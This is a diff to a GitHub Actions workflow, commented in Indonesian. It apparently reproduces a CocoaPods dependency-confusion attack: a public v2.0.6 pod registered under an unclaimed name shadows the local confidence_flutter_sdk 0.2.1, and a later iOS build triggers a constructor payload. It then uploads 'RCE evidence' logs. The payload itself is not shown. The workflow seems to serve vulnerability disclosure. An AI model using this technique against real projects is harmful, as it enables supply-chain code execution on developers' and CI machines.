@@ -12,47 +12,50 @@ jobs:
 
       - name: Execute Silent Hijack (Natural Sequence)
         run: |
-          # 1. INITIALIZATION
+          # 1. INITIALIZATION: Simulasi environment bersih (CI/CD atau Fresh Dev Machine)
           rm -rf rce_test
           flutter create rce_test
           cd rce_test
           
           # 2. FOLLOW OFFICIAL DOCUMENTATION
+          # Menambah plugin via pubspec.yaml sesuai instruksi README Spotify
           echo "=== Adding SDK via Official Instructions ==="
           flutter pub add confidence_flutter_sdk:0.2.1
           
           cd ios
-          # Bypass platform version constraint agar build tidak stuck
+          # Bypass platform constraint agar build tidak stuck (Standar iOS Dev Fix)
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' Podfile
 
           echo "=== First Time Resolution (Developer Step) ==="
-          # Jalankan pod install pertama kali untuk membuat lockfile
-          # Di sini CocoaPods akan mencoba memetakan dependensi
+          # Jalankan pod install pertama kali untuk membuat lockfile awal
+          # Di sini symlink Flutter (0.2.1) masih terdeteksi
           pod install --verbose || true
           
           echo "=== Triggering Semantic Precedence Hijack ==="
-          # Sekarang kita paksa update. Karena di Trunk ada 2.0.6 (milik lu)
-          # dan di lokal cuma ada 0.2.1, CocoaPods secara algoritma
-          # akan memilih versi publik yang lebih tinggi.
+          # INI POINT KRUSIALNYA:
+          # Kita TIDAK hapus helper script. Kita cuma jalankan 'pod update'.
+          # Karena lu punya v2.0.6 di Trunk Publik (Unclaimed Namespace),
+          # CocoaPods akan memprioritaskan versi publik di atas path lokal symlink.
           pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
           
           echo "=== Verify Shadowing Success (Checking Lockfile) ==="
+          # Jika berhasil, Podfile.lock akan menunjukkan versi 2.0.6 lu
           grep -A 1 "confidence_flutter_sdk" Podfile.lock
           
           cd ..
           # 3. EXECUTION PHASE
           echo "=== Launching Build to Trigger Payload ==="
-          # Payload script_phase akan dieksekusi oleh Xcode sebelum kompilasi
+          # Xcode akan mengeksekusi payload __attribute__((constructor)) saat linking/build
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
-          echo "=== Verification: Search for Payload Execution ==="
+          echo "=== Verification: Search for Payload Execution in Logs ==="
           grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"
 
       - name: Upload Evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rce-evidence-natural
+          name: rce-evidence-natural-v2.0.6
           path: |
             rce_test/ios/pod_update.log
             rce_test/ios/Podfile.lock
